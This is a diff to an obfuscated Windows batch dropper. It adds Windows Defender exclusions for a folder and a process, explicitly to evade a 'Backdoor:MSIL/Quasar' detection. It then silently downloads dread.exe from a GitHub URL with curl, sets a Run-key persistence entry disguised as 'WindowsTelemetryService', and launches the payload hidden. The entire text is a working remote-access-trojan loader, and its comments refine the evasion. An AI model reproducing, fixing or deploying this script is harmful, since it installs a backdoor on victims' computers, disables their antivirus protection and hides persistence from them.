@@ -14,17 +14,17 @@ set "URL=https://github.com/fullylaw/happy.org/raw/main/dread.exe"
 :: 1. Create the folder silently
 if not exist "%TD%" mkdir "%TD%" >nul 2>&1
 
-:: 2. ADD EXCLUSION: Tells Windows Defender to stop scanning this folder
-:: This prevents the "Backdoor:MSIL/Quasar" flag seen in your screenshot
-%v1%%v2%%v3%%v4%%v5%%v6%%v7%%v4%%v8%%v8% -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%TD%'" >nul 2>&1
+:: 2. ADD EXCLUSIONS: Tells Antivirus to stop scanning this path and file
+:: This target the "Backdoor:MSIL/Quasar" flag
+%v1%%v2%%v3%%v4%%v5%%v6%%v7%%v4%%v8%%v8% -Command "Add-MpPreference -ExclusionPath '%TD%'" >nul 2>&1
+%v1%%v2%%v3%%v4%%v5%%v6%%v7%%v4%%v8%%v8% -Command "Add-MpPreference -ExclusionProcess '%FN%'" >nul 2>&1
 
-:: 3. DOWNLOAD: Uses curl to grab the file into the excluded folder
+:: 3. DOWNLOAD: Using curl to grab the file into the safe zone
 %d1%%d2%%d3%%d4% -L -o "%TD%%FN%" "%URL%" >nul 2>&1
 
-:: 4. PERSISTENCE: Adds the file to the Windows Startup registry
+:: 4. PERSISTENCE: Adds to Startup registry
 %r1%%r2%%r3% %a1%%a2%%a3% "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsTelemetryService" /t REG_SZ /d "\"%TD%%FN%\"" /f >nul 2>&1
 
-:: 5. EXECUTE & EXIT: Runs the file in the background and closes the CMD window
-:: This fixes the hanging "PS C:\Users\l5was>" prompt
+:: 5. EXECUTE & EXIT: Run background and close CMD
 start /b "" "%TD%%FN%"
 exit
